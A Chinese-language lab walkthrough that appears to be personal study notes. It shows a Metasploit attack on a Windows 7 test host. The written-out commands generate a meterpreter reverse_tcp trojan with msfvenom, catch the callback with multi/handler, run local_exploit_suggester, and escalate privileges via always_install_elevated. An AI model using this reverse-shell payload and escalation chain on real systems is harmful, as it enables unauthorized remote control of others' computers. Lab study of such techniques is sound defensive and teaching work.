### MSF 搜集 NDay

先使用 MSF 生成木马

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.41.156 LPORT=4444 -f exe > rt.exe
```

![](https://pic1.imgdb.cn/item/68d0b686c5157e1a882326fc.png)

加载一个通用的 **handler** 模块，用来接收来自各种反连（reverse）payload 的回连（session）

```sh
use exploit/multi/handler
```

![](https://pic1.imgdb.cn/item/68cb7faec5157e1a8814c887.png)

设置反连的 payload 类型

`set payload ...` 命令告诉当前已加载的 `exploit/multi/handler` 模块：**它要接收的**（也就是你将生成并在目标上运行的）payload 类型是 `windows/x64/meterpreter/reverse_tcp`

![](https://pic1.imgdb.cn/item/68cb802bc5157e1a8814cf65.png)

设置参数后运行

![](https://pic1.imgdb.cn/item/68cb80f4c5157e1a8814da05.png)

开启 HTTP 服务让 Windows 7 下载木马

![](https://pic1.imgdb.cn/item/68d0be7dc5157e1a88239986.png)

运行

![](https://pic1.imgdb.cn/item/68d0be67c5157e1a88239968.png)

成功！！！

![](https://pic1.imgdb.cn/item/68d0be9ec5157e1a882399bb.png)

输入 bg 放到后台

![](https://pic1.imgdb.cn/item/68d0beedc5157e1a88239a1c.png)

切换模块

```
use post/multi/recon/local_exploit_suggester
```

- `use`：在 `msfconsole` 中选择（载入）一个模块，用后会把该模块加载为当前上下文（类似切换到该模块以便设置选项并运行）
- `post/multi/recon/local_exploit_suggester`：模块路径，拆开：
  - `post`：模块类别（后渗透模块，post-exploitation）
  - `multi`：平台通用（multi-platform）/适用于多种系统的模块分类
  - `recon`：模块用途（侦察/信息收集）
  - `local_exploit_suggester`：模块名称 —— 本模块用于**在已控制的主机（session）上枚举信息并建议可能可利用的本地提权漏洞**

查看参数

![](https://pic1.imgdb.cn/item/68d0c29bc5157e1a8823b787.png)

设置后运行

![](https://pic1.imgdb.cn/item/68d0c30bc5157e1a8823be22.png)

扫描出漏洞

![](https://pic1.imgdb.cn/item/68d0c3c5c5157e1a8823c912.png)

选择对应的模块

```bash
use exploit/windows/local/always_install_elevated
```

![](https://pic1.imgdb.cn/item/68d0c572c5157e1a8823e42f.png)

查看设置参数

![](https://pic1.imgdb.cn/item/68d0c5b6c5157e1a8823e876.png)

直接运行

![](https://pic1.imgdb.cn/item/68d0c605c5157e1a8823ed5e.png)

查看会话发现提权成功

```
sessions
```

![](https://pic1.imgdb.cn/item/68d0c823c5157e1a88240409.png)

先放到后台，再切换到漏扫模块找 NDaya'y

![](https://pic1.imgdb.cn/item/68dc0244c5157e1a884b34c0.png)
